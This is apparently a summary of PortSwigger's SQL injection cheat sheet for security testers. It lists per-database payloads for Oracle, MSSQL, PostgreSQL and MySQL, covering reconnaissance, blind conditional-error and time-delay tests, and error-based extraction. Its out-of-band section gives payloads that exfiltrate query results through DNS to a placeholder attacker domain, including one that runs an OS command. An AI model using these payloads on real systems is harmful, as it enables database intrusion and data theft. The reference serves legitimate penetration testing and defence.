# 🛡️ SQL Injection Cheat Sheet — PortSwigger (Summary)

This cheat sheet provides a comprehensive reference for various SQL Injection (SQLi) syntaxes across popular database management systems (DBMS) including Oracle, Microsoft SQL Server, PostgreSQL, and MySQL. It serves as a quick guide for executing string manipulation, database reconnaissance, blind logic errors, and out-of-band data exfiltration.

---

## 🛠️ Core Syntax & Manipulation

| Database Type | String Concatenation | Substring Extraction (Returns `ba` from `foobar`) | Comment Syntax |
| :--- | :--- | :--- | :--- |
| **Oracle** | `'foo'\|\|'bar'` | `SUBSTR('foobar', 4, 2)` | `--comment` |
| **Microsoft** | `'foo'+'bar'` | `SUBSTRING('foobar', 4, 2)` | `--comment` یا `/*comment*/` |
| **PostgreSQL**| `'foo'\|\|'bar'` | `SUBSTRING('foobar', 4, 2)` | `--comment` یا `/*comment*/` |
| **MySQL** | `'foo' 'bar'` یا `CONCAT('foo','bar')` | `SUBSTRING('foobar', 4, 2)` | `#comment` یا `-- comment` یا `/*comment*/` |

---

## 🔍 Database Reconnaissance

| Database Type | Querying Type & Version | Listing Tables & Columns |
| :--- | :--- | :--- |
| **Oracle** | `SELECT banner FROM v$version`<br>`SELECT version FROM v$instance` | `SELECT * FROM all_tables`<br>`SELECT * FROM all_tab_columns WHERE table_name = 'TABLE-NAME'` |
| **Microsoft** | `SELECT @@version` | `SELECT * FROM information_schema.tables`<br>`SELECT * FROM information_schema.columns WHERE table_name = 'TABLE-NAME'` |
| **PostgreSQL**| `SELECT version()` | `SELECT * FROM information_schema.tables`<br>`SELECT * FROM information_schema.columns WHERE table_name = 'TABLE-NAME'` |
| **MySQL** | `SELECT @@version` | `SELECT * FROM information_schema.tables`<br>`SELECT * FROM information_schema.columns WHERE table_name = 'TABLE-NAME'` |

---

## ⏱️ Blind & Error-Based Payloads

### 1. Conditional Errors
Trigger a database error conditionally when a boolean expression evaluates to true:
* **Oracle:** `SELECT CASE WHEN (CONDITION) THEN TO_CHAR(1/0) ELSE NULL END FROM dual`
* **Microsoft:** `SELECT CASE WHEN (CONDITION) THEN 1/0 ELSE NULL END`
* **PostgreSQL:** `1 = (SELECT CASE WHEN (CONDITION) THEN 1/(SELECT 0) ELSE NULL END)`
* **MySQL:** `SELECT IF(CONDITION,(SELECT table_name FROM information_schema.tables),'a')`

### 2. Time Delays & Conditional Delays
Force a synchronous delay (e.g., 10 seconds) to infer data over blind channels:
* **Oracle:** `dbms_pipe.receive_message(('a'),10)`
    * *Conditional:* `SELECT CASE WHEN (CONDITION) THEN 'a'\|\|dbms_pipe.receive_message(('a'),10) ELSE NULL END FROM dual`
* **Microsoft:** `WAITFOR DELAY '0:0:10'`
    * *Conditional:* `IF (CONDITION) WAITFOR DELAY '0:0:10'`
* **PostgreSQL:** `SELECT pg_sleep(10)`
    * *Conditional:* `SELECT CASE WHEN (CONDITION) THEN pg_sleep(10) ELSE pg_sleep(0) END`
* **MySQL:** `SELECT SLEEP(10)`
    * *Conditional:* `SELECT IF(CONDITION,SLEEP(10),'a')`

### 3. Data Extraction via Visible Errors
* **Microsoft:** `SELECT 'foo' WHERE 1 = (SELECT 'secret')`
* **PostgreSQL:** `SELECT CAST((SELECT password FROM users LIMIT 1) AS int)`
* **MySQL:** `SELECT 'foo' WHERE 1=1 AND EXTRACTVALUE(1, CONCAT(0x5c, (SELECT 'secret')))`

---

## 🌐 Out-of-Band (OAST) & DNS Exfiltration

When an application processes queries asynchronously, Out-of-Band Application Security Testing (OAST) techniques force network interactions to an attacker-controlled domain (e.g., Burp Collaborator).

### Oracle
* **DNS Lookup:**
    ```sql
    SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://BURP-COLLABORATOR-SUBDOMAIN/"> %remote;]>'),'/l') FROM dual
    ```
* **Data Exfiltration:**
    ```sql
    SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://'||(SELECT YOUR-QUERY-HERE)||'.BURP-COLLABORATOR-SUBDOMAIN/"> %remote;]>'),'/l') FROM dual
    ```

### Microsoft (MSSQL)
* **DNS Lookup:**
    ```sql
    exec master..xp_dirtree '//BURP-COLLABORATOR-SUBDOMAIN/a'
    ```
* **Data Exfiltration:**
    ```sql
    declare @p varchar(1024);set @p=(SELECT YOUR-QUERY-HERE);exec('master..xp_dirtree "//'+@p+'.BURP-COLLABORATOR-SUBDOMAIN/a"')
    ```

### PostgreSQL
* **DNS Lookup:**
    ```sql
    copy (SELECT '') to program 'nslookup BURP-COLLABORATOR-SUBDOMAIN'
    ```
* **Data Exfiltration:**
    ```sql
    create OR replace function f() returns void as $$
    declare c text; declare p text;
    begin
    SELECT into p (SELECT YOUR-QUERY-HERE);
    c := 'copy (SELECT '''') to program ''nslookup '||p||'.BURP-COLLABORATOR-SUBDOMAIN''';
    execute c;
    END;
    $$ language plpgsql security definer;
    SELECT f();
    ```

### MySQL (Windows Only)
* **DNS Lookup:**
    ```sql
    LOAD_FILE('\\\\BURP-COLLABORATOR-SUBDOMAIN\\a')
    ```
* **Data Exfiltration:**
    ```sql
    SELECT YOUR-QUERY-HERE INTO OUTFILE '\\\\BURP-COLLABORATOR-SUBDOMAIN\a'
    ```

---

## 📊 Key Takeaways

- **Syntax Diversity:** Each database platform handles string concatenation, comments, and time delays differently. Payload customization depends heavily on target finger-printing.
- **MySQL Comment Nuance:** In MySQL, the double-dash comment (`--`) requires a trailing space (`-- `) to be recognized properly; otherwise, use `#`.
- **Oracle FROM Constraint:** Every `SELECT` statement in Oracle requires a `FROM` clause; use the built-in `DUAL` table when testing generic expressions.
- **OAST Power:** Out-of-band data exfiltration via DNS lookups bypasses traditional blind restrictions and allows reading data asynchronously.

---

## 🧠 Final Summary

A cheat sheet is an indispensable resource for handling database-specific logic variations during security testing. Successfully identifying the backend DBMS flavor unlocks the ability to use specialized techniques—ranging from simple visible errors to complex OAST data exfiltration—allowing testers to thoroughly map and assess application vulnerabilities.

---

**Task Status: ✔ Completed**